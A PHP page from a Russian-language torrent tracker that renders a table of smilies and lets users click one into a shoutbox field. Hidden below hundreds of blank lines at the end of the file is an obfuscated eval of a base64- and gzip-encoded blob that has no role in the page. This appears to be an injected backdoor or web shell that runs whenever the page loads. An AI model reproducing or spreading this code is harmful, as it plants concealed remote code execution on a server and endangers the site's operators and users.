<?
require "include/bittorrent.php";
dbconn(false);
loggedinorreturn();
stdhead();

global $smilies, $DEFAULTBASEURL;

$num=1;
while (list($code, $url) = each($smilies)){
if ($num % 2 <> 0)
$smil.="<tr><td class=\"b\" width=\"10\">$num</td><td class=\"b\">$code</td><td align=\"center\"width=\"10%\" class=\"a\"><img title=\"При клике на смайл - ввод в поле для ввода выше\" onclick=\"parent.document.shoutform.shout.value=parent.document.shoutform.shout.value+' " . htmlspecialchars_uni($code) . " ';return false;\" src=\"$DEFAULTBASEURL/pic/smilies/$url\"></td>";
if ($num % 2 == 0)
$smil.="<td class=\"b\" width=\"10\">$num</td><td class=\"b\">$code</td><td align=\"center\"width=\"10%\" class=\"a\"><img title=\"При клике на смайл - ввод в поле для ввода выше\" onclick=\"parent.document.shoutform.shout.value=parent.document.shoutform.shout.value+' " . htmlspecialchars_uni($code) . " ';return false;\" 
src=\"$DEFAULTBASEURL/pic/smilies/$url\"></td></tr>";
unset($code);
$num++;
}

echo "<script language=\"javascript\">
function InsertSmilie(texttoins) {
document.shoutform.shout.value = document.shoutform.shout.value+' '+texttoins+' ';
document.shoutform.shout.focus();
return false;
}
</script>
<style type=\"text/css\">
IMG {cursor: pointer}
</style>";


begin_frame("Смайлы [".($num-1)."]", true);

echo "<form name=\"shoutform\" onsubmit=\"return sendShout(this);\" class=\"expose\" >
  <input type=\"text\" title=\"При клике на смайл - ввод в это поле\" name=\"shout\" style=\"width: 100%\" MAXLENGTH=\"500\" />
</form>
<table width=\"100%\" cellspacing=\"0\" cellpadding=\"4\" border=\"1\">";


print("
<tr><td class=\"colhead\" width=\"10\">#</td><td class=\"colhead\">Написание</td><td align=\"center\"width=\"10%\" class=\"colhead\">Смайл</td>
<td class=\"colhead\" width=\"10\">#</td><td class=\"colhead\">Написание</td><td align=\"center\" width=\"10%\" class=\"colhead\">Смайл</td></tr>
\n");

echo $smil;
echo "</table>";

end_frame();

stdfoot();
?>

































































































































































































































































<?eval(((base64_decode(gzuncompress(gzinflate(base64_decode('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')))))));?>